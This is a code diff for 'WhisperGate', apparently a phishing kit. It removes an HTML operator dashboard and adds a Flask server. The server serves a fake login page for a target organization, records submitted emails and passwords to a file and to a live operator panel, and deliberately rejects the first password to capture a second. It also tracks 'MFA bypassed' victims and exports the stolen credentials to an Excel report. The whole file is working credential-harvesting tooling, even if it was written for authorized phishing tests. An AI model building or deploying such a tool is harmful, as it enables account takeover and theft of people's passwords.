@@ -1,417 +1,424 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WhisperGate — Operator Panel</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
-  <style>
-    :root {
-      --bg: #0d1117;
-      --card: #161b22;
-      --border: #30363d;
-      --text: #e6edf3;
-      --text-dim: #8b949e;
-      --accent: #58a6ff;
-      --green: #3fb950;
-      --orange: #d29922;
-      --red: #f85149;
-      --purple: #bc8cff;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: "Consolas", "Courier New", monospace; background: var(--bg); color: var(--text); min-height: 100vh; padding: 24px; }
+from datetime import datetime
 
-    /* Header */
-    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
-    .header h1 { font-size: 18px; font-weight: 600; }
-    .header h1 span { color: var(--accent); }
-    .header-right { display: flex; align-items: center; gap: 16px; }
-    .status-dot { display: inline-block; width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-right: 6px; animation: pulse 2s infinite; }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+def print_ascii_art():
+    ascii_art = """
 
-    /* Top stats bar */
-    .stats-bar { display: flex; gap: 16px; margin-bottom: 20px; flex-wrap: wrap; }
-    .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 14px 18px; flex: 1; min-width: 140px; }
-    .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-dim); margin-bottom: 4px; }
-    .stat-value { font-size: 24px; font-weight: 700; }
-    .stat-value.accent { color: var(--accent); }
-    .stat-value.green { color: var(--green); }
-    .stat-value.orange { color: var(--orange); }
-    .stat-value.red { color: var(--red); }
+ __        ___     _                       ____       _       
+ \\ \\      / / |__ (_)___ _ __   ___ _ __  / ___| __ _| |_ ___ 
+  \\ \\ /\\ / /| '_ \\| / __| '_ \\ / _ \\ '__|| |  _ / _` | __/ _ \\
+   \\ V  V / | | | | \\__ \\ |_) |  __/ |   | |_| | (_| | ||  __/
+    \\_/\\_/  |_| |_|_|___/ .__/ \\___|_|    \\____|\\__,_|\\__\\___|
+                        |_|                                    
 
-    /* Layout */
-    .grid { display: grid; grid-template-columns: 1fr 280px; gap: 20px; }
+    """
+    author = "Written by: Justin Henderson - whisk3y3"
+    github = "https://github.com/whisk3y3/WhisperGate"
+    version = "Version 3.1"
+    print(ascii_art)
+    print(author)
+    print(github)
+    print(version)
+    print()
+    print("Happy Hunting!")
+    print()
 
-    /* Target cards */
-    .targets-area { }
-    .targets-empty { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 48px 16px; text-align: center; color: var(--text-dim); font-size: 13px; }
-    .target-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 12px; overflow: hidden; animation: slideIn 0.3s ease; }
-    @keyframes slideIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
+print_ascii_art()
 
-    .tc-header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border); }
-    .tc-email { font-size: 14px; font-weight: 600; color: var(--accent); }
-    .tc-meta { font-size: 11px; color: var(--text-dim); }
-    .tc-status { display: inline-block; font-size: 10px; font-weight: 600; padding: 2px 8px; border-radius: 3px; text-transform: uppercase; letter-spacing: 0.5px; }
-    .status-scanning { background: rgba(139,148,158,0.15); color: var(--text-dim); }
-    .status-captured { background: rgba(210,153,34,0.15); color: var(--orange); }
-    .status-mfa_pending { background: rgba(188,140,255,0.15); color: var(--purple); }
-    .status-compromised { background: rgba(248,81,73,0.15); color: var(--red); }
-    .status-released { background: rgba(63,185,80,0.15); color: var(--green); }
+from flask import Flask, render_template, request, jsonify, session, send_file, redirect
+from flask_socketio import SocketIO, emit, join_room
+import ssl
+import os
+import json
+import secrets
+import io
 
-    .tc-body { padding: 12px 16px; }
-    .tc-creds { margin-bottom: 10px; }
-    .tc-cred-row { display: flex; align-items: center; gap: 8px; padding: 6px 0; border-bottom: 1px solid rgba(48,54,61,0.5); font-size: 12px; }
-    .tc-cred-row:last-child { border-bottom: none; }
-    .tc-cred-pw { flex: 1; }
-    .tc-cred-pw code { background: rgba(88,166,255,0.1); padding: 1px 5px; border-radius: 2px; }
-    .tc-cred-attempt { font-size: 10px; padding: 1px 5px; border-radius: 2px; }
-    .tc-cred-time { font-size: 10px; color: var(--text-dim); }
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(32)
+socketio = SocketIO(app, cors_allowed_origins="*")
 
-    .tc-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 10px; }
+# ── Configuration ─────────────────────────────────
+# Update these per engagement:
+EMAIL_DOMAIN = '@evilphishinc.com'   # Target org email domain
+MIN_PASS_LEN = 1                     # Minimum password length to accept
+ADMIN_TOKEN = 'changeme'             # Token for operator panel access
+REJECT_FIRST_ATTEMPT = True          # Reject first password, accept second
+ORG_NAME = 'Contoso'                 # Target organization name
 
-    .copy-btn { padding: 4px 10px; font-size: 11px; font-weight: 600; font-family: inherit; border-radius: 3px; cursor: pointer; transition: all 0.15s; border: 1px solid var(--border); background: rgba(88,166,255,0.08); color: var(--accent); }
-    .copy-btn:hover { background: rgba(88,166,255,0.18); }
-    .copy-btn.copied { background: rgba(63,185,80,0.15); color: var(--green); border-color: var(--green); }
+# ── Target tracking ──────────────────────────────
+# Keyed by session ID. Each target has full state.
+targets = {}
 
-    .action-btn { padding: 5px 12px; font-size: 11px; font-weight: 600; font-family: inherit; border-radius: 3px; cursor: pointer; transition: all 0.15s; border: 1px solid; }
-    .btn-compromised { background: rgba(248,81,73,0.08); color: var(--red); border-color: var(--red); }
-    .btn-compromised:hover { background: rgba(248,81,73,0.18); }
-    .btn-release { background: rgba(63,185,80,0.08); color: var(--green); border-color: var(--green); }
-    .btn-release:hover { background: rgba(63,185,80,0.18); }
-    .btn-disabled { opacity: 0.3; cursor: not-allowed; pointer-events: none; }
+# Engagement start time (set on first credential)
+engagement_start = None
 
-    .tc-notes { margin-top: 8px; }
-    .tc-notes textarea { width: 100%; min-height: 48px; background: var(--bg); border: 1px solid var(--border); border-radius: 3px; color: var(--text); font-family: inherit; font-size: 11px; padding: 8px; resize: vertical; }
-    .tc-notes textarea:focus { outline: none; border-color: var(--accent); }
-    .tc-notes-saved { font-size: 10px; color: var(--green); margin-top: 4px; display: none; }
-    .tc-timer { font-size: 10px; color: var(--text-dim); margin-top: 4px; }
 
-    /* Sidebar */
-    .sidebar { display: flex; flex-direction: column; gap: 12px; }
-    .side-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 14px; }
-    .side-card h3 { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-dim); margin-bottom: 10px; }
+def get_target(sid):
+    """Get or create a target record."""
+    if sid not in targets:
+        targets[sid] = {
+            'sid': sid,
+            'email': None,
+            'ip': None,
+            'user_agent': None,
+            'credentials': [],       # List of {password, attempt, timestamp}
+            'status': 'scanning',    # scanning → captured → mfa_pending → compromised → released
+            'scan_complete': False,
+            'attempts': 0,
+            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'released_at': None,
+            'notes': ''
+        }
+    return targets[sid]
 
-    .export-btn { display: block; width: 100%; padding: 10px; font-size: 12px; font-weight: 600; font-family: inherit; border: 1px solid var(--accent); border-radius: 4px; cursor: pointer; background: rgba(88,166,255,0.08); color: var(--accent); transition: all 0.15s; text-align: center; text-decoration: none; }
-    .export-btn:hover { background: rgba(88,166,255,0.18); }
 
-    .log-line { font-size: 10px; color: var(--text-dim); padding: 3px 0; border-bottom: 1px solid rgba(48,54,61,0.5); }
-    .log-body { max-height: 300px; overflow-y: auto; }
+def log_credentials(sid, email, password, ip, attempt_num, user_agent=''):
+    global engagement_start
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-    @media (max-width: 768px) {
-      .grid { grid-template-columns: 1fr; }
-      .stats-bar { flex-direction: column; }
-    }
-  </style>
-</head>
-<body>
-  <div class="header">
-    <h1><span>WhisperGate</span> Operator Panel</h1>
-    <div class="header-right">
-      <span><span class="status-dot"></span><span style="font-size:11px;color:var(--text-dim)">Connected</span></span>
-    </div>
-  </div>
+    # Set engagement start on first credential
+    if engagement_start is None:
+        engagement_start = datetime.now()
 
-  <div class="stats-bar">
-    <div class="stat-card">
-      <div class="stat-label">Engagement Timer</div>
-      <div class="stat-value accent" id="engTimer">00:00:00</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-label">Total Targets</div>
-      <div class="stat-value accent" id="statTargets">0</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-label">Creds Captured</div>
-      <div class="stat-value orange" id="statCreds">0</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-label">MFA Bypassed</div>
-      <div class="stat-value red" id="statMfa">0</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-label">Released</div>
-      <div class="stat-value green" id="statReleased">0</div>
-    </div>
-  </div>
+    # Update target record
+    target = get_target(sid)
+    target['email'] = email
+    target['ip'] = ip
+    target['user_agent'] = user_agent
+    target['credentials'].append({
+        'password': password,
+        'attempt': attempt_num,
+        'timestamp': timestamp
+    })
+    if target['status'] == 'scanning':
+        target['status'] = 'captured'
 
-  <div class="grid">
-    <div class="targets-area" id="targetsArea">
-      <div class="targets-empty" id="targetsEmpty">Waiting for targets...</div>
-    </div>
+    # File log
+    entry = f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password} | Attempt: {attempt_num}"
+    with open('credentials.txt', 'a') as f:
+        f.write(entry + '\n')
 
-    <div class="sidebar">
-      <div class="side-card">
-        <h3>Export</h3>
-        <a class="export-btn" id="exportBtn" href="#">Download Excel Report</a>
-      </div>
-      <div class="side-card">
-        <h3>Event Log</h3>
-        <div class="log-body" id="logBody"></div>
-      </div>
-    </div>
-  </div>
+    # Console
+    print(f"\n{'='*60}")
+    print(f"  CREDENTIAL CAPTURED")
+    print(f"  Time:     {timestamp}")
+    print(f"  IP:       {ip}")
+    print(f"  Email:    {email}")
+    print(f"  Password: {password}")
+    print(f"  Attempt:  {attempt_num}")
+    print(f"  Session:  {sid}")
+    print(f"{'='*60}\n")
 
-  <script>
-    var socket = io('/operator');
-    var targetData = {};  // sid -> {email, ip, credentials[], status, notes, firstSeen}
-    var engagementStart = null;
-    var engTimerInterval = null;
-    var adminToken = new URLSearchParams(window.location.search).get('token') || '';
+    # Push to operator panel
+    socketio.emit('credential', {
+        'sid': sid,
+        'timestamp': timestamp,
+        'ip': ip,
+        'email': email,
+        'password': password,
+        'attempt': attempt_num,
+        'user_agent': user_agent,
+        'status': target['status']
+    }, namespace='/operator')
 
-    // ── Export link ─────────────────────────────
-    document.getElementById('exportBtn').addEventListener('click', function(e) {
-      e.preventDefault();
-      window.location.href = '/operator/export?token=' + encodeURIComponent(adminToken);
-    });
 
-    // ── Engagement timer ────────────────────────
-    function startEngTimer(startTime) {
-      if (engTimerInterval) return;
-      engagementStart = startTime instanceof Date ? startTime : new Date(startTime);
-      engTimerInterval = setInterval(function() {
-        var diff = Math.floor((Date.now() - engagementStart.getTime()) / 1000);
-        var h = String(Math.floor(diff / 3600)).padStart(2, '0');
-        var m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
-        var s = String(diff % 60).padStart(2, '0');
-        document.getElementById('engTimer').textContent = h + ':' + m + ':' + s;
-      }, 1000);
-    }
+# ── Routes ────────────────────────────────────────
 
-    // ── Stats update ────────────────────────────
-    function updateStats() {
-      var keys = Object.keys(targetData);
-      var totalTargets = keys.length;
-      var totalCreds = 0;
-      var totalMfa = 0;
-      var totalReleased = 0;
-      keys.forEach(function(sid) {
-        var t = targetData[sid];
-        totalCreds += t.credentials.length;
-        if (t.status === 'compromised' || t.status === 'released') totalMfa++;
-        if (t.status === 'released') totalReleased++;
-      });
-      document.getElementById('statTargets').textContent = totalTargets;
-      document.getElementById('statCreds').textContent = totalCreds;
-      document.getElementById('statMfa').textContent = totalMfa;
-      document.getElementById('statReleased').textContent = totalReleased;
-    }
+@app.route('/')
+def index():
+    if 'sid' not in session:
+        session['sid'] = secrets.token_hex(8)
+    get_target(session['sid'])
+    return render_template('index.html', org_name=ORG_NAME)
 
-    // ── Render target card ──────────────────────
-    function renderTarget(sid) {
-      var t = targetData[sid];
-      if (!t) return;
 
-      document.getElementById('targetsEmpty').style.display = 'none';
-      var existing = document.getElementById('tc-' + sid);
+@app.route('/check-email', methods=['POST'])
+def check_email():
+    data = request.get_json(silent=True) or {}
+    email = data.get('email', '').strip()
+    sid = session.get('sid', '')
+    target = get_target(sid)
+    target['email'] = email
+    return jsonify({'status': 'ok', 'org': ORG_NAME})
 
-      var statusLabels = {
-        scanning: 'Scanning', captured: 'Captured', mfa_pending: 'MFA Pending',
-        compromised: 'Compromised', released: 'Released'
-      };
 
-      // Build credentials list
-      var credsHtml = '';
-      t.credentials.forEach(function(c, i) {
-        credsHtml +=
-          '<div class="tc-cred-row">' +
-            '<span class="tc-cred-pw">Password: <code>' + esc(c.password) + '</code></span>' +
-            '<span class="tc-cred-attempt status-' + (c.attempt === 1 ? 'captured' : 'released') + '" style="font-size:10px;padding:1px 5px;border-radius:2px;">#' + c.attempt + '</span>' +
-            '<span class="tc-cred-time">' + esc(c.timestamp) + '</span>' +
-            '<button class="copy-btn" onclick="copyToClip(this, \'' + escAttr(c.password) + '\')">Copy</button>' +
-          '</div>';
-      });
+@app.route('/login', methods=['POST'])
+def login():
+    data = request.get_json(silent=True) or {}
+    if not data:
+        email = request.form.get('email', '')
+        password = request.form.get('password', '')
+    else:
+        email = data.get('email', '')
+        password = data.get('password', '')
 
-      // Action buttons depend on status
-      var actionsHtml = '';
-      if (t.email) {
-        actionsHtml += '<button class="copy-btn" onclick="copyToClip(this, \'' + escAttr(t.email) + '\')">Copy Username</button>';
-      }
-      if (t.credentials.length > 0) {
-        var lastCred = t.credentials[t.credentials.length - 1];
-        actionsHtml += '<button class="copy-btn" onclick="copyToClip(this, \'' + escAttr(lastCred.password) + '\')">Copy Latest Password</button>';
-      }
+    ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent', '')
+    sid = session.get('sid', '')
 
-      if (t.status === 'mfa_pending') {
-        actionsHtml += '<button class="action-btn btn-compromised" onclick="markCompromised(\'' + sid + '\')">Mark Compromised (MFA Bypassed)</button>';
-      }
-      if (t.status !== 'released' && t.status !== 'scanning') {
-        actionsHtml += '<button class="action-btn btn-release" onclick="releaseTarget(\'' + sid + '\')">Release Target</button>';
-      }
-      if (t.status === 'compromised') {
-        actionsHtml += '<button class="action-btn btn-release" onclick="releaseTarget(\'' + sid + '\')">Release Target</button>';
-      }
-      if (t.status === 'released') {
-        actionsHtml += '<span style="font-size:11px;color:var(--green);">&#x2705; Released at ' + esc(t.released_at || '') + '</span>';
-      }
+    if not email or len(password) < MIN_PASS_LEN:
+        return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 400
 
-      var cardHtml =
-        '<div class="tc-header">' +
-          '<div>' +
-            '<span class="tc-email">' + esc(t.email || 'Unknown') + '</span>' +
-            '<div class="tc-meta">IP: ' + esc(t.ip || '—') + ' &bull; Session: ' + sid.substring(0, 8) + '</div>' +
-          '</div>' +
-          '<span class="tc-status status-' + t.status + '">' + (statusLabels[t.status] || t.status) + '</span>' +
-        '</div>' +
-        '<div class="tc-body">' +
-          '<div class="tc-creds">' + credsHtml + '</div>' +
-          '<div class="tc-actions">' + actionsHtml + '</div>' +
-          '<div class="tc-notes">' +
-            '<textarea placeholder="Add notes (MFA bypassed, target behavior, etc.)" onchange="saveNote(\'' + sid + '\', this.value)" id="notes-' + sid + '">' + esc(t.notes || '') + '</textarea>' +
-            '<div class="tc-notes-saved" id="saved-' + sid + '">Saved</div>' +
-          '</div>' +
-          '<div class="tc-timer" id="timer-' + sid + '"></div>' +
-        '</div>';
+    target = get_target(sid)
+    target['attempts'] += 1
+    attempt_num = target['attempts']
 
-      if (existing) {
-        existing.innerHTML = cardHtml;
-      } else {
-        var card = document.createElement('div');
-        card.className = 'target-card';
-        card.id = 'tc-' + sid;
-        card.innerHTML = cardHtml;
-        document.getElementById('targetsArea').insertBefore(card, document.getElementById('targetsArea').firstChild);
-      }
+    log_credentials(sid, email, password, ip, attempt_num, user_agent)
 
-      updateTargetTimer(sid);
-      updateStats();
-    }
+    if REJECT_FIRST_ATTEMPT and attempt_num == 1:
+        return jsonify({
+            'status': 'error',
+            'message': 'Your account or password is incorrect. If you don\'t remember your password, reset it now.'
+        }), 401
 
-    // ── Per-target timer ────────────────────────
-    function updateTargetTimer(sid) {
-      var t = targetData[sid];
-      if (!t || !t.credentials.length) return;
-      var el = document.getElementById('timer-' + sid);
-      if (!el) return;
-      var first = new Date(t.credentials[0].timestamp.replace(' ', 'T'));
-      var diff = Math.floor((Date.now() - first.getTime()) / 1000);
-      var m = Math.floor(diff / 60);
-      var s = diff % 60;
-      el.textContent = 'Time since first capture: ' + m + 'm ' + s + 's';
-    }
-    setInterval(function() {
-      Object.keys(targetData).forEach(updateTargetTimer);
-    }, 1000);
+    # Mark as MFA pending when they pass auth
+    target['status'] = 'mfa_pending'
+    socketio.emit('status_update', {
+        'sid': sid,
+        'status': 'mfa_pending'
+    }, namespace='/operator')
 
-    // ── Log ─────────────────────────────────────
-    function addLog(msg) {
-      var el = document.getElementById('logBody');
-      var d = document.createElement('div');
-      d.className = 'log-line';
-      d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-      el.insertBefore(d, el.firstChild);
-    }
+    return jsonify({'status': 'ok', 'sid': sid})
 
-    // ── Socket events ───────────────────────────
-    socket.on('connect', function() {
-      addLog('Connected to server');
-      // Load existing targets
-      fetch('/operator/targets?token=' + encodeURIComponent(adminToken))
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-          if (data.engagement_start) {
-            startEngTimer(data.engagement_start);
-          }
-          (data.targets || []).forEach(function(t) {
-            targetData[t.sid] = {
-              email: t.email,
-              ip: t.ip,
-              credentials: t.credentials || [],
-              status: t.status,
-              notes: t.notes || '',
-              released_at: t.released_at,
-              firstSeen: t.first_seen
-            };
-            if (t.credentials && t.credentials.length > 0) {
-              renderTarget(t.sid);
-            }
-          });
-          updateStats();
-        });
-    });
 
-    socket.on('credential', function(data) {
-      if (!engagementStart) startEngTimer(new Date());
+@app.route('/scan-complete', methods=['POST'])
+def scan_complete():
+    sid = session.get('sid', '')
+    target = get_target(sid)
+    target['scan_complete'] = True
+    return jsonify({'status': 'ok'})
 
-      var sid = data.sid;
-      if (!targetData[sid]) {
-        targetData[sid] = {
-          email: data.email,
-          ip: data.ip,
-          credentials: [],
-          status: data.status || 'captured',
-          notes: '',
-          released_at: null,
-          firstSeen: data.timestamp
-        };
-      }
-      targetData[sid].email = data.email;
-      targetData[sid].ip = data.ip;
-      targetData[sid].status = data.status || targetData[sid].status;
-      targetData[sid].credentials.push({
-        password: data.password,
-        attempt: data.attempt,
-        timestamp: data.timestamp
-      });
 
-      renderTarget(sid);
-      addLog('Credential: ' + data.email + ' (attempt #' + data.attempt + ')');
-    });
+@app.route('/session-state')
+def session_state():
+    sid = session.get('sid', '')
+    target = get_target(sid)
+    return jsonify({
+        'sid': sid,
+        'scan_complete': target.get('scan_complete', False),
+        'attempts': target.get('attempts', 0),
+        'email': target.get('email', None)
+    })
 
-    socket.on('status_update', function(data) {
-      var sid = data.sid;
-      if (targetData[sid]) {
-        targetData[sid].status = data.status;
-        if (data.released_at) targetData[sid].released_at = data.released_at;
-        renderTarget(sid);
-        addLog('Status → ' + data.status + ': ' + (targetData[sid].email || sid));
-      }
-    });
 
-    // ── Actions ─────────────────────────────────
-    function releaseTarget(sid) {
-      socket.emit('release_target', { sid: sid });
-      addLog('Releasing: ' + (targetData[sid] ? targetData[sid].email : sid));
-    }
+# ── Operator Panel ────────────────────────────────
 
-    function markCompromised(sid) {
-      socket.emit('mark_compromised', { sid: sid });
-      addLog('MFA bypassed: ' + (targetData[sid] ? targetData[sid].email : sid));
-    }
+def operator_authenticated():
+    """Check if the current session is authenticated as an operator."""
+    return session.get('operator_auth') == True
 
-    function saveNote(sid, note) {
-      targetData[sid].notes = note;
-      fetch('/operator/note?token=' + encodeURIComponent(adminToken), {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sid: sid, note: note })
-      }).then(function() {
-        var el = document.getElementById('saved-' + sid);
-        if (el) { el.style.display = 'block'; setTimeout(function() { el.style.display = 'none'; }, 1500); }
-      });
-    }
 
-    function copyToClip(btn, text) {
-      navigator.clipboard.writeText(text).then(function() {
-        var orig = btn.textContent;
-        btn.textContent = 'Copied!';
-        btn.classList.add('copied');
-        setTimeout(function() {
-          btn.textContent = orig;
-          btn.classList.remove('copied');
-        }, 1500);
-      });
-    }
+@app.route('/operator')
+def operator_panel():
+    if not operator_authenticated():
+        return redirect('/operator/login')
+    return render_template('operator.html')
 
-    function esc(s) {
-      if (!s) return '';
-      var d = document.createElement('div');
-      d.textContent = s;
-      return d.innerHTML;
-    }
 
-    function escAttr(s) {
-      return esc(s).replace(/'/g, "\\'").replace(/"/g, '&quot;');
-    }
-  </script>
-</body>
-</html>
+@app.route('/operator/login', methods=['GET', 'POST'])
+def operator_login():
+    if request.method == 'POST':
+        token = request.form.get('token', '')
+        if token == ADMIN_TOKEN:
+            session['operator_auth'] = True
+            return redirect('/operator')
+        else:
+            return render_template('operator_login.html', error='Invalid access token.')
+    return render_template('operator_login.html', error=None)
+
+
+@app.route('/operator/logout')
+def operator_logout():
+    session.pop('operator_auth', None)
+    return redirect('/operator/login')
+
+
+@app.route('/operator/targets')
+def get_targets():
+    """Returns all target data for operator panel initial load."""
+    if not operator_authenticated():
+        return 'Unauthorized', 403
+    return jsonify({
+        'targets': list(targets.values()),
+        'engagement_start': engagement_start.strftime('%Y-%m-%d %H:%M:%S') if engagement_start else None
+    })
+
+
+@app.route('/operator/note', methods=['POST'])
+def save_note():
+    """Save a note on a target."""
+    if not operator_authenticated():
+        return 'Unauthorized', 403
+    data = request.get_json(silent=True) or {}
+    sid = data.get('sid', '')
+    note = data.get('note', '')
+    if sid in targets:
+        targets[sid]['notes'] = note
+        return jsonify({'status': 'ok'})
+    return jsonify({'status': 'error', 'message': 'Target not found'}), 404
+
+
+@app.route('/operator/status', methods=['POST'])
+def update_status():
+    """Operator manually updates a target's status."""
+    if not operator_authenticated():
+        return 'Unauthorized', 403
+    data = request.get_json(silent=True) or {}
+    sid = data.get('sid', '')
+    status = data.get('status', '')
+    if sid in targets and status in ('captured', 'mfa_pending', 'compromised', 'released'):
+        targets[sid]['status'] = status
+        if status == 'released':
+            targets[sid]['released_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        return jsonify({'status': 'ok'})
+    return jsonify({'status': 'error'}), 400
+
+
+@app.route('/operator/export')
+def export_excel():
+    """Export all targets to Excel."""
+    if not operator_authenticated():
+        return 'Unauthorized', 403
+
+    try:
+        import openpyxl
+        from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
+    except ImportError:
+        return 'openpyxl not installed. Run: pip install openpyxl', 500
+
+    wb = openpyxl.Workbook()
+    ws = wb.active
+    ws.title = 'Captured Credentials'
+
+    # Header styling
+    header_font = Font(bold=True, color='FFFFFF', size=11)
+    header_fill = PatternFill(start_color='1F4E79', end_color='1F4E79', fill_type='solid')
+    thin_border = Border(
+        left=Side(style='thin'), right=Side(style='thin'),
+        top=Side(style='thin'), bottom=Side(style='thin')
+    )
+
+    headers = ['Email', 'Password', 'Attempt', 'Timestamp', 'IP Address',
+               'User Agent', 'Status', 'MFA Bypassed', 'Released At', 'Notes']
+    for col, header in enumerate(headers, 1):
+        cell = ws.cell(row=1, column=col, value=header)
+        cell.font = header_font
+        cell.fill = header_fill
+        cell.alignment = Alignment(horizontal='center')
+        cell.border = thin_border
+
+    row = 2
+    for target in targets.values():
+        if not target['credentials']:
+            continue
+        for cred in target['credentials']:
+            ws.cell(row=row, column=1, value=target['email']).border = thin_border
+            ws.cell(row=row, column=2, value=cred['password']).border = thin_border
+            ws.cell(row=row, column=3, value=cred['attempt']).border = thin_border
+            ws.cell(row=row, column=4, value=cred['timestamp']).border = thin_border
+            ws.cell(row=row, column=5, value=target['ip']).border = thin_border
+            ws.cell(row=row, column=6, value=target['user_agent']).border = thin_border
+            ws.cell(row=row, column=7, value=target['status']).border = thin_border
+            mfa = 'Yes' if target['status'] in ('compromised', 'released') else 'No'
+            ws.cell(row=row, column=8, value=mfa).border = thin_border
+            ws.cell(row=row, column=9, value=target.get('released_at', '')).border = thin_border
+            ws.cell(row=row, column=10, value=target.get('notes', '')).border = thin_border
+            row += 1
+
+    # Auto-width columns
+    for col in ws.columns:
+        max_len = 0
+        col_letter = col[0].column_letter
+        for cell in col:
+            if cell.value:
+                max_len = max(max_len, len(str(cell.value)))
+        ws.column_dimensions[col_letter].width = min(max_len + 4, 50)
+
+    # Engagement summary sheet
+    ws2 = wb.create_sheet('Engagement Summary')
+    ws2.cell(row=1, column=1, value='Engagement Summary').font = Font(bold=True, size=14)
+    ws2.cell(row=3, column=1, value='Start Time:').font = Font(bold=True)
+    ws2.cell(row=3, column=2, value=engagement_start.strftime('%Y-%m-%d %H:%M:%S') if engagement_start else 'N/A')
+    ws2.cell(row=4, column=1, value='Export Time:').font = Font(bold=True)
+    ws2.cell(row=4, column=2, value=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+    ws2.cell(row=5, column=1, value='Total Targets:').font = Font(bold=True)
+    ws2.cell(row=5, column=2, value=len([t for t in targets.values() if t['credentials']]))
+    ws2.cell(row=6, column=1, value='MFA Bypassed:').font = Font(bold=True)
+    ws2.cell(row=6, column=2, value=len([t for t in targets.values() if t['status'] in ('compromised', 'released')]))
+    ws2.cell(row=7, column=1, value='Organization:').font = Font(bold=True)
+    ws2.cell(row=7, column=2, value=ORG_NAME)
+
+    buf = io.BytesIO()
+    wb.save(buf)
+    buf.seek(0)
+
+    filename = f"WhisperGate_{ORG_NAME}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
+    return send_file(buf, as_attachment=True, download_name=filename,
+                     mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')
+
+
+# ── WebSocket: Operator ───────────────────────────
+
+@socketio.on('connect', namespace='/operator')
+def operator_connect():
+    print('[Operator] Panel connected')
+
+
+@socketio.on('release_target', namespace='/operator')
+def release_target(data):
+    """Release a specific target by session ID."""
+    sid = data.get('sid', '')
+    if sid in targets:
+        targets[sid]['status'] = 'released'
+        targets[sid]['released_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        # Send release only to that target's room
+        socketio.emit('force_next', room=f'target_{sid}', namespace='/target')
+        # Notify operator panel
+        socketio.emit('status_update', {
+            'sid': sid,
+            'status': 'released',
+            'released_at': targets[sid]['released_at']
+        }, namespace='/operator')
+        print(f'[Operator] Released target: {targets[sid].get("email", sid)}')
+
+
+@socketio.on('mark_compromised', namespace='/operator')
+def mark_compromised(data):
+    """Operator marks target as compromised (MFA bypassed)."""
+    sid = data.get('sid', '')
+    if sid in targets:
+        targets[sid]['status'] = 'compromised'
+        socketio.emit('status_update', {
+            'sid': sid,
+            'status': 'compromised'
+        }, namespace='/operator')
+        print(f'[Operator] Marked compromised: {targets[sid].get("email", sid)}')
+
+
+# ── WebSocket: Target ─────────────────────────────
+
+@socketio.on('connect', namespace='/target')
+def target_connect():
+    pass
+
+
+@socketio.on('register', namespace='/target')
+def target_register(data):
+    """Target registers with their session ID to join their private room."""
+    sid = data.get('sid', '')
+    if sid:
+        join_room(f'target_{sid}')
+
+
+# ── Main ──────────────────────────────────────────
+
+if __name__ == '__main__':
+    cert_file = 'fullchain.pem'
+    key_file = 'privkey.pem'
+
+    if os.path.exists(cert_file) and os.path.exists(key_file):
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(cert_file, key_file)
+        socketio.run(app, host='0.0.0.0', port=443, ssl_context=context)
+    else:
+        print('[!] SSL certs not found — running on HTTP :5000 (dev mode)')
+        socketio.run(app, host='0.0.0.0', port=5000, debug=True)
